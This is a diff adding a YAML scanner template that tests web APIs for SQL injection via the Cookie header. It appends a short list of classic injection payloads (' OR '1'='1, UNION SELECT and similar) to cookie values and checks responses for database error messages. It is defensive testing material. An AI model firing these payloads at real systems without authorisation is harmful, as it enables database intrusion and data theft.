@@ -1,0 +1,139 @@
+id: SQL_INJECTION_COOKIE_HEADER
+info:
+  name: "SQL Injection test on Cookie Header"
+  description: >
+    "SQL Injection testing on the Cookie header involves assessing web applications for vulnerabilities where the Cookie HTTP header is improperly sanitized or directly used in SQL queries. Attackers manipulate cookie values to inject malicious SQL commands, aiming to exploit backend databases like MySQL. This test helps identify and mitigate security weaknesses by uncovering potential injection points where user-supplied cookie data is processed without adequate validation."
+  details: >
+    "SQL Injection testing on the Cookie header targets vulnerabilities in web applications where cookie values are improperly handled and sanitized. Attackers manipulate these cookies to inject SQL queries, potentially compromising the backend MySQL database. This test aims to uncover weaknesses in how the application processes cookie data, helping to prevent unauthorized access and data manipulation through cookie-based SQL injection attacks."
+  impact: >
+    "The impact of SQL Injection through the Cookie header can be significant, potentially compromising the security and integrity of the web application's database. Successful exploitation may allow attackers to execute unauthorized SQL commands, leading to data breaches, data manipulation, or deletion within the MySQL database. This can result in unauthorized access to sensitive information, disruption of services, financial loss, and reputational damage to the organization."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: SQL_INJECTION_COOKIE_HEADER
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_headers:
+    for_one:
+      key:
+        regex: "^Cookie$|^cookie$"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  cookieHeaderPayloads:
+    - "' OR '1'='1"
+    - "' OR 1=1 --"
+    - "' OR 'x'='x"
+    - "' OR 1=1 LIMIT 1 --"
+    - "' UNION SELECT null,null,null --"
+    - "' AND 1=0 --"
+    - "'; SELECT 1; --"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_header:
+            userKey: ${userVal}${cookieHeaderPayloads}
+
+validate:
+  or:
+    - response_payload:
+        length:
+          gt: 0
+        contains_either:
+          - SQL syntax
+          - MySQL
+          - mysqli
+          - MySQLSyntaxErrorException
+          - Mysqli_Exception
+          - MySqlException
+          - SQLSTATE
+          - PostgreSQL
+          - valid PostgreSQL result
+          - Npgsql
+          - PSQLException
+          - SQL Server
+          - SQLServer JDBC Driver
+          - SqlConnection
+          - SqlException
+          - Oracle error
+          - quoted string not properly terminated
+          - OracleException
+          - SQLite
+          - SQLITE_ERROR
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "SQLiteException"
+          - "SQLITE_CONSTRAINT"
+    - response_headers:
+        for_one:
+          key:
+            regex: .*
+          value:
+            contains_either:
+              - "' OR '1'='1"
+              - "' OR 1=1 --"
+              - "' OR 'x'='x"
+              - "' OR 1=1 LIMIT 1 --"
+              - "' UNION SELECT null,null,null --"
+              - "' AND 1=0 --"
+              - "'; SELECT 1; --"
